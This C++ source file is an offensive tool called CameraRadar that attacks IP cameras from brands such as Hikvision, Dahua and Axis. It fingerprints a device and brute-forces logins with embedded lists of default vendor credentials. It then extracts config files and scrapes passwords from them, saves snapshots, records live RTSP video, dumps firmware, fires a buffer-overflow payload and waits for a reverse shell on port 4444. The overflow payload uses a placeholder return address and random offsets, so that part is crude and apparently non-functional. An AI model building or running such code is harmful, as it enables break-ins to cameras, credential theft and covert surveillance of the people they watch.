#include <iostream>
#include <string>
#include <vector>
#include <map>
#include <set>
#include <cstring>
#include <sstream>
#include <iomanip>
#include <fstream>
#include <thread>
#include <chrono>
#include <ctime>
#include <algorithm>
#include <regex>
#include <random>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <netinet/in.h>
#include <unistd.h>
#include <fcntl.h>
#include <curl/curl.h>
#include <openssl/md5.h>
#include <openssl/sha.h>

#ifdef __linux__
#include <sys/utsname.h>
#endif

using namespace std;

#define VERSION "3.0"
#define MAX_PAYLOAD 8192

string local_ip = "";
string output_dir = "loot";
vector<string> extracted_passwords;
vector<string> extracted_images;
vector<string> extracted_videos;
bool is_mobile = false;
bool has_pcap = false;

size_t write_callback(void* contents, size_t size, size_t nmemb, string* output) {
    size_t total = size * nmemb;
    output->append((char*)contents, total);
    return total;
}

void detect_environment() {
    #ifdef __ANDROID__
        is_mobile = true;
    #else
        const char* termux = getenv("PREFIX");
        if(termux && string(termux).find("com.termux") != string::npos) is_mobile = true;
        else {
            struct utsname unameData;
            uname(&unameData);
            string sys = string(unameData.sysname) + " " + string(unameData.machine);
            if(sys.find("Android") != string::npos || sys.find("android") != string::npos) is_mobile = true;
            else is_mobile = false;
        }
    #endif
    
    if(access("/usr/include/pcap.h", F_OK) == 0 || access("/data/data/com.termux/files/usr/include/pcap.h", F_OK) == 0)
        has_pcap = true;
    else has_pcap = false;
}

string get_local_ip() {
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    struct sockaddr_in serv;
    serv.sin_family = AF_INET;
    serv.sin_addr.s_addr = inet_addr("8.8.8.8");
    serv.sin_port = htons(53);
    connect(fd, (struct sockaddr*)&serv, sizeof(serv));
    struct sockaddr_in name;
    socklen_t namelen = sizeof(name);
    getsockname(fd, (struct sockaddr*)&name, &namelen);
    close(fd);
    return string(inet_ntoa(name.sin_addr));
}

void ensure_output_dir() {
    mkdir(output_dir.c_str(), 0755);
    mkdir((output_dir + "/videos").c_str(), 0755);
    mkdir((output_dir + "/images").c_str(), 0755);
    mkdir((output_dir + "/dump").c_str(), 0755);
}

string md5_hash(const string& input) {
    unsigned char digest[MD5_DIGEST_LENGTH];
    MD5((unsigned char*)input.c_str(), input.length(), digest);
    char out[33];
    for(int i=0; i<16; i++) sprintf(out+i*2, "%02x", digest[i]);
    return string(out);
}

struct Fingerprint {
    string brand;
    string model;
    string firmware;
    string arch;
    int http_port;
    int rtsp_port;
    string rtsp_path;
    vector<string> snapshot_paths;
    vector<string> config_paths;
    vector<string> dump_paths;
    int overflow_offset;
    map<string, string> default_creds;
};

vector<pair<string, vector<string>>> brand_signatures = {
    {"Hikvision", {"Hikvision", "iVMS", "hik", "DS-2", "DS-7"}},
    {"Dahua", {"Dahua", "DVR", "XVR", "IPC-H", "DH-"}},
    {"TP-Link", {"TP-Link", "TP-LINK", "NC200", "Tapo"}},
    {"Uniview", {"Uniview", "IPC", "NVR"}},
    {"Axis", {"Axis", "AXIS", "M10", "M30"}},
    {"Sony", {"Sony", "SNC-"}},
    {"Panasonic", {"Panasonic", "WV-"}},
    {"Bosch", {"Bosch", "DINION"}},
    {"Vivotek", {"Vivotek", "VS-", "FD-"}},
    {"Foscam", {"Foscam", "FI-", "C1"}},
    {"Reolink", {"Reolink", "RLC-", "E1"}},
    {"Amcrest", {"Amcrest", "IP2M", "IP4M"}},
    {"EZVIZ", {"EZVIZ", "CS-"}},
    {"IMOU", {"IMOU", "Imou", "IPC-"}},
    {"Xiaomi", {"Xiaomi", "Mi Home", "MJSX"}}
};

map<string, vector<string>> brand_default_creds = {
    {"Hikvision", {"admin:12345", "admin:123456", "admin:admin12345", "root:root"}},
    {"Dahua", {"admin:admin", "admin:123456", "admin:888888", "root:root"}},
    {"TP-Link", {"admin:admin", "admin:12345"}},
    {"Axis", {"root:pass", "admin:admin"}},
    {"Sony", {"admin:admin", "admin:12345"}},
    {"Panasonic", {"admin:12345"}},
    {"Bosch", {"service:service", "admin:admin"}},
    {"Vivotek", {"admin:admin", "root:root"}},
    {"Amcrest", {"admin:admin", "admin:123456"}},
    {"Reolink", {"admin:admin"}},
    {"Foscam", {"admin:admin", "guest:guest"}}
};

Fingerprint fingerprint(const string& ip, int port) {
    Fingerprint fp;
    fp.brand = "unknown";
    fp.model = "unknown";
    fp.firmware = "unknown";
    fp.arch = "unknown";
    fp.http_port = port;
    fp.rtsp_port = 554;
    fp.rtsp_path = "/stream";
    fp.snapshot_paths = {"/snapshot.jpg", "/cgi-bin/snapshot.cgi", "/image.jpg", "/capture"};
    fp.config_paths = {"/config/config.xml", "/system/config", "/cgi-bin/config"};
    fp.dump_paths = {"/firmware.bin", "/update.bin", "/mtd/rom"};
    fp.overflow_offset = 512;
    
    CURL* curl = curl_easy_init();
    if(curl) {
        string response;
        string url = "http://" + ip + ":" + to_string(port) + "/";
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
        curl_easy_setopt(curl, CURLOPT_TIMEOUT, 5L);
        
        if(curl_easy_perform(curl) == CURLE_OK) {
            for(auto& sig : brand_signatures) {
                for(auto& pattern : sig.second) {
                    if(response.find(pattern) != string::npos) {
                        fp.brand = sig.first;
                        break;
                    }
                }
                if(fp.brand != "unknown") break;
            }
            
            regex model_regex(R"(([A-Z]{2,4}-?[0-9A-Z]{3,10}))");
            smatch match;
            if(regex_search(response, match, model_regex)) fp.model = match[1];
            
            if(response.find("arm") != string::npos) fp.arch = "arm";
            else if(response.find("mips") != string::npos) fp.arch = "mips";
            else if(response.find("x86") != string::npos) fp.arch = "x86";
        }
        curl_easy_cleanup(curl);
    }
    
    fp.default_creds["admin"] = "admin";
    fp.default_creds["admin"] = "12345";
    fp.default_creds["root"] = "root";
    fp.default_creds["user"] = "user";
    
    if(brand_default_creds.count(fp.brand)) {
        for(const auto& cred : brand_default_creds[fp.brand]) {
            size_t colon = cred.find(':');
            if(colon != string::npos) fp.default_creds[cred.substr(0, colon)] = cred.substr(colon+1);
        }
    }
    
    random_device rd;
    mt19937 gen(rd());
    uniform_int_distribution<> dis(300, 700);
    fp.overflow_offset = dis(gen);
    
    return fp;
}

string send_request(const string& ip, int port, const string& path, const string& user="", const string& pass="") {
    CURL* curl = curl_easy_init();
    string response;
    if(curl) {
        string url = "http://" + ip + ":" + to_string(port) + path;
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
        curl_easy_setopt(curl, CURLOPT_TIMEOUT, 5L);
        if(!user.empty()) {
            curl_easy_setopt(curl, CURLOPT_HTTPAUTH, CURLAUTH_ANY);
            curl_easy_setopt(curl, CURLOPT_USERPWD, (user + ":" + pass).c_str());
        }
        curl_easy_perform(curl);
        curl_easy_cleanup(curl);
    }
    return response;
}

void brute_force(const string& ip, int port, map<string,string>& creds, vector<pair<string,string>>& valid) {
    cout << "[*] Brute forcing..." << endl;
    for(auto& cred : creds) {
        string resp = send_request(ip, port, "/", cred.first, cred.second);
        if(resp.find("401") == string::npos && !resp.empty()) {
            valid.push_back(cred);
            extracted_passwords.push_back(cred.first + ":" + cred.second);
            cout << "[+] Found: " << cred.first << ":" << cred.second << endl;
        }
        this_thread::sleep_for(chrono::milliseconds(50));
    }
}

void extract_config(const string& ip, int port, const string& user, const string& pass) {
    Fingerprint fp = fingerprint(ip, port);
    for(auto& path : fp.config_paths) {
        string data = send_request(ip, port, path, user, pass);
        if(!data.empty() && (data.find("pass") != string::npos || data.find("user") != string::npos)) {
            string fname = output_dir + "/config_" + ip + ".xml";
            ofstream f(fname); f << data; f.close();
            cout << "[+] Config: " << fname << endl;
            
            regex pass_regex(R"(pass(word)?["']?\s*[=:]\s*["']?([^"'\s]+))");
            smatch m;
            string::const_iterator it(data.cbegin());
            while(regex_search(it, data.cend(), m, pass_regex)) {
                extracted_passwords.push_back(m[2]);
                it = m.suffix().first;
            }
        }
    }
}

void extract_snapshots(const string& ip, int port, const string& user, const string& pass) {
    Fingerprint fp = fingerprint(ip, port);
    for(auto& path : fp.snapshot_paths) {
        string url = "http://" + ip + ":" + to_string(port) + path;
        string fname = output_dir + "/images/shot_" + ip + "_" + to_string(time(NULL)) + ".jpg";
        CURL* curl = curl_easy_init();
        if(curl) {
            curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
            if(!user.empty()) curl_easy_setopt(curl, CURLOPT_USERPWD, (user + ":" + pass).c_str());
            FILE* out = fopen(fname.c_str(), "wb");
            if(out) {
                curl_easy_setopt(curl, CURLOPT_WRITEDATA, out);
                if(curl_easy_perform(curl) == CURLE_OK) {
                    extracted_images.push_back(fname);
                    cout << "[+] Snapshot: " << fname << endl;
                }
                fclose(out);
            }
            curl_easy_cleanup(curl);
        }
    }
}

void record_stream(const string& ip, int port, const string& path, const string& user, const string& pass, int sec) {
    string rtsp = "rtsp://" + ip + ":" + to_string(port) + path;
    if(!user.empty()) rtsp = "rtsp://" + user + ":" + pass + "@" + ip + ":" + to_string(port) + path;
    string fname = output_dir + "/videos/stream_" + ip + "_" + to_string(time(NULL)) + ".mp4";
    cout << "[*] Recording " << sec << "s to " << fname << endl;
    string cmd = "ffmpeg -y -i \"" + rtsp + "\" -t " + to_string(sec) + " -c copy \"" + fname + "\" 2>/dev/null";
    if(system(cmd.c_str()) == 0 && access(fname.c_str(), F_OK) == 0) {
        extracted_videos.push_back(fname);
        cout << "[+] Video saved" << endl;
    } else cout << "[-] ffmpeg failed" << endl;
}

void overflow(const string& ip, int port, const Fingerprint& fp) {
    cout << "[*] Overflow to " << ip << ":" << port << endl;
    vector<uint8_t> payload(MAX_PAYLOAD, 0x41);
    uint32_t ret = htonl(0xdeadbeef);
    memcpy(&payload[fp.overflow_offset], &ret, 4);
    
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    inet_pton(AF_INET, ip.c_str(), &addr.sin_addr);
    if(connect(sock, (struct sockaddr*)&addr, sizeof(addr)) == 0) {
        send(sock, payload.data(), payload.size(), 0);
        cout << "[+] Payload sent" << endl;
    } else cout << "[-] Connect failed" << endl;
    close(sock);
}

void shell_listener(int port) {
    cout << "[*] Listening on port " << port << endl;
    int srv = socket(AF_INET, SOCK_STREAM, 0);
    int opt = 1;
    setsockopt(srv, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port = htons(port);
    bind(srv, (struct sockaddr*)&addr, sizeof(addr));
    listen(srv, 5);
    int cli = accept(srv, NULL, NULL);
    char buf[4096];
    while(int n = recv(cli, buf, sizeof(buf)-1, 0)) {
        buf[n] = 0;
        cout << buf;
        string cmd(buf);
        if(cmd.find("passwd") != string::npos) extracted_passwords.push_back(cmd);
    }
    close(cli); close(srv);
}

void banner() {
    cout << "\033[92m";
    cout << "  .__  .__      .___.__  .__      \n";
    cout << " |  | |__| ____|__|  | |__|____  \n";
    cout << " |  | |  |/ ___\\|  |  | |  \\__  \\ \n";
    cout << " |  |_|  / /_/  >  |  |_|  |/ __ \\_\n";
    cout << " |____/__\\___  /|__|____/__ (____  /\n";
    cout << "           /\\/               \\/   \n";
    cout << "  CameraRadar v" << VERSION << " | " << (is_mobile ? "Lite" : "Full") << " mode\n";
    cout << "\033[0m";
}

void help() {
    banner();
    cout << "Usage: ./camradar -i IP [-p PORT] [-m MODULE] [-o DIR] [-t SEC]\n";
    cout << "  -i IP       Target IP\n";
    cout << "  -p PORT     Port (default: 80)\n";
    cout << "  -m MODULE   auto, brute, extract, stream, overflow, shell\n";
    cout << "  -o DIR      Output dir (default: loot)\n";
    cout << "  -t SEC      Record seconds (default: 30)\n";
    cout << "  --lport P   Shell listener port\n";
    cout << "  --creds F   Custom user:pass file\n";
    cout << "\nExamples:\n";
    cout << "  ./camradar -i 192.168.1.100\n";
    cout << "  ./camradar -i 10.0.0.5 -m extract -o data\n";
    cout << "  ./camradar -i 203.0.113.50 -m stream -t 60\n";
}

int main(int argc, char** argv) {
    detect_environment();
    if(argc < 2) { help(); return 0; }
    
    string ip = "", module = "auto", cred_file = "";
    int port = 80, stream_sec = 30, lport = 4444;
    
    for(int i=1; i<argc; i++) {
        string arg = argv[i];
        if(arg == "-h" || arg == "--help") { help(); return 0; }
        else if(arg == "-i" && i+1<argc) ip = argv[++i];
        else if(arg == "-p" && i+1<argc) port = atoi(argv[++i]);
        else if(arg == "-m" && i+1<argc) module = argv[++i];
        else if(arg == "-o" && i+1<argc) output_dir = argv[++i];
        else if(arg == "-t" && i+1<argc) stream_sec = atoi(argv[++i]);
        else if(arg == "--lport" && i+1<argc) lport = atoi(argv[++i]);
        else if(arg == "--creds" && i+1<argc) cred_file = argv[++i];
    }
    
    if(ip.empty()) { cout << "[-] Missing IP\n"; return 1; }
    
    banner();
    ensure_output_dir();
    local_ip = get_local_ip();
    
    cout << "[+] Target: " << ip << ":" << port << " | Mode: " << module << endl;
    Fingerprint fp = fingerprint(ip, port);
    cout << "[+] " << fp.brand << " " << fp.model << " | " << fp.firmware << " | " << fp.arch << endl;
    
    vector<pair<string,string>> valid_creds;
    
    if(module == "brute" || module == "auto") {
        brute_force(ip, port, fp.default_creds, valid_creds);
        if(!cred_file.empty()) {
            ifstream cf(cred_file);
            string line;
            while(getline(cf, line)) {
                size_t c = line.find(':');
                if(c != string::npos) fp.default_creds[line.substr(0,c)] = line.substr(c+1);
            }
            brute_force(ip, port, fp.default_creds, valid_creds);
        }
    }
    
    string user = "", pass = "";
    if(!valid_creds.empty()) { user = valid_creds[0].first; pass = valid_creds[0].second; }
    
    if(module == "extract" || module == "auto") {
        extract_config(ip, port, user, pass);
        extract_snapshots(ip, port, user, pass);
        if(!is_mobile) {
            for(auto& p : fp.dump_paths) {
                string fname = output_dir + "/dump/firmware_" + ip + ".bin";
                ofstream f(fname);
                f << send_request(ip, port, p, user, pass);
                if(f.tellp() > 1024) cout << "[+] Dump: " << fname << endl;
                f.close();
            }
        }
    }
    
    if(module == "stream" || module == "auto") {
        record_stream(ip, fp.rtsp_port, fp.rtsp_path, user, pass, stream_sec);
    }
    
    if(module == "overflow" || module == "auto") {
        overflow(ip, port, fp);
    }
    
    if(module == "shell") {
        thread t(shell_listener, lport);
        t.detach();
        overflow(ip, port, fp);
        cout << "[+] Waiting shell on " << lport << " ..." << endl;
        this_thread::sleep_for(chrono::seconds(60));
    }
    
    cout << "\n[+] Results:\n";
    cout << "  Passwords: " << extracted_passwords.size() << "\n";
    cout << "  Images: " << extracted_images.size() << "\n";
    cout << "  Videos: " << extracted_videos.size() << "\n";
    cout << "  Output: " << output_dir << endl;
    
    return 0;
}
